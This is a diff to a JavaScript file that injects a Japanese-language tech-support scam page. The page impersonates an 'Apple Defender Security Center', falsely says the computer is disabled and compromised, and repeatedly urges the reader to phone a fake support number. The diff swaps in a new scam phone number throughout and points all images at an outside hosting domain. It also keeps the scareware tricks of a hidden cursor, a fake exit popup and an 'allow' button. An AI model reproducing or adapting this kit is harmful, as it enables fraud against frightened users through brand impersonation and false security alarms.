@@ -2,17 +2,17 @@
 document.getElementById("wbesjcj").innerHTML = `
     
 <div class="bg" style="cursor:none">
-    <div class="bgimg" style="top:0"><img src="images/nsjcjawHjd.png" alt="" width="100%"></div>
+    <div class="bgimg" style="top:0"><img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/nsjcjawHjd.png" alt="" width="100%"></div>
 </div>
 <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
     <div class="black" style="height: 145%; cursor: none; display: block;"></div>
 </a>
-<div class="pro_box3" style="cursor: none; display: block;"><img src="images/hbvzuhndcj.jpg" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
+<div class="pro_box3" style="cursor: none; display: block;"><img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/hbvzuhndcj.jpg" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
 </div>
 <div id="footer">
     <div class="row">
         <div class="col-md-12">
-            <div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="images/apple.png"> Apple_セキュリティ </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください 0101-866-881-2460              </span>                    </span>
+            <div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/apple.png"> Apple_セキュリティ </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください 0101-888-756-9828              </span>                    </span>
             </div>
         </div>
         <div class="col-md-12">
@@ -25,15 +25,15 @@ document.getElementById("wbesjcj").innerHTML = `
 </div>
 <div class="lightbox" id="poptxt" style="display: block;">
     <div class="ilb top" style="font-size:17px">
-        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5"><span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="images/dm.png" class="logo3">            </span>Apple_Defender_セキュリティセンター</span> <span class="fl title2" id="txts1">            <a href="#" id="bgt">              <img src="images/cs.png">            </a>          </span>
+        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5"><span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/dm.png" class="logo3">            </span>Apple_Defender_セキュリティセンター</span> <span class="fl title2" id="txts1">            <a href="#" id="bgt">              <img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/cs.png">            </a>          </span>
         </div>
     </div>
     <div id="txtintro"><span class="colo-rd">          <div id="ip_add">Apple_Defender_セキュリティセンター</div>          <div id="cityopm">セキュリティ侵害の影響を受けたシステム</div>          <div id="isp"> (エラーコード: 16JPsy7)</div>        </span>
     </div>
-    <img src="images/re.gif" id="banner">
-    <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。 <br> <span class="support" style="font-size:22px;">Apple サポートに問い合わせてください: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください 0101-866-881-2460          </span>            </span>
+    <img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/re.gif" id="banner">
+    <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。 <br> <span class="support" style="font-size:22px;">Apple サポートに問い合わせてください: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください 0101-888-756-9828          </span>            </span>
     </div>
-    <div id="bottom"><img src="images/apple.png" id="badge"> <span class="title3">Apple</span>
+    <div id="bottom"><img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/apple.png" id="badge"> <span class="title3">Apple</span>
         <ul>
             <li><a href="#">
                 <div class="fr button2"><span id="addtochromebutton">許可する</span></div>
@@ -52,7 +52,7 @@ document.getElementById("wbesjcj").innerHTML = `
     <br> すぐにご連絡ください。電話で、弊社のエンジニアが削除手順をご案内します。 <br> 直ちに Apple
     サポートに連絡して、脅威を報告し、個人情報の盗難を止め、このデバイスへのアクセスをブロック解除してください。 <br>
     このウィンドウを閉じると、Apple の登録が一時停止され、個人情報が危険にさらされる可能性があります。 <br>
-    <p style="padding-bottom:0;color:#fff;font-size:16px">Apple サポートに電話してください: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>直接お電話ください  0101-866-881-2460          </span></strong>
+    <p style="padding-bottom:0;color:#fff;font-size:16px">Apple サポートに電話してください: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>直接お電話ください  0101-888-756-9828          </span></strong>
     </p>
     <div class="action_buttons"><a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">わかりました</a> <a class="active" id="leave_page" style="color:#fff!important">キャンセル</a>
     </div>
@@ -61,13 +61,13 @@ document.getElementById("wbesjcj").innerHTML = `
     <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
         できるだけ早くご連絡ください。弊社のエンジニアが電話で削除手順をサポートいたします。お使いのコンピューターは無効になっています。Apple
         Defender SmartScreen が認識されないアプリケーションを停止しています。このアプリを実行すると、システムの安全性が損なわれる可能性があります。
-        <br> <strong>Appleサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="images/winlo.png" alt="�" style="width: 25px;vertical-align: bottom;"> 直接お電話ください 0101-866-881-2460          </span>
+        <br> <strong>Appleサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/winlo.png" alt="�" style="width: 25px;vertical-align: bottom;"> 直接お電話ください 0101-888-756-9828          </span>
     </strong></p>
 </div>
-<div id="chat" style="display: block;"><img src="images/apple.png"> <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Apple</span>
+<div id="chat" style="display: block;"><img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/apple.png"> <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Apple</span>
     <p style="font-weight:600;font-size:24px">サポートに電話する: <br></p>
-    <h4 style="font-weight:600;font-size:22px"><img src="images/winlo.png" alt="" style="width: 25px;margin-left: 0;"> 電話してください
-        0101-866-881-2460
+    <h4 style="font-weight:600;font-size:22px"><img src="https://tp-g7uh.onrender.com/Ma0cHelpAsMEr0t0140images/winlo.png" alt="" style="width: 25px;margin-left: 0;"> 電話してください
+        0101-888-756-9828
         <br>(セキュリティヘルプデスク)
     </h4>
     <div class="arrow-down">
@@ -84,7 +84,7 @@ document.getElementById("wbesjcj").innerHTML = `
     <div style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">
         <p class="text-center" style="color: #FEFEFE; font-size: large;"> コンピュータを再起動したり、操作したりしないでください。<br>
             お使いのコンピュータは無効化されました。すぐにお電話ください。<br> このコンピュータでは、セキュリティ上の理由によりアクセスがブロックされています。<br>
-            直ちにご連絡ください。技術者が問題解決をサポートいたします。<br>直接お電話ください 0101-866-881-2460       </p></div>
+            直ちにご連絡ください。技術者が問題解決をサポートいたします。<br>直接お電話ください 0101-888-756-9828       </p></div>
 </div>
 <div id="exit-popup" style="display: block;"><h3>サイトを離れますか？</h3>
     <p style="font-size: large">本当にこのページを退出しますか？</p>
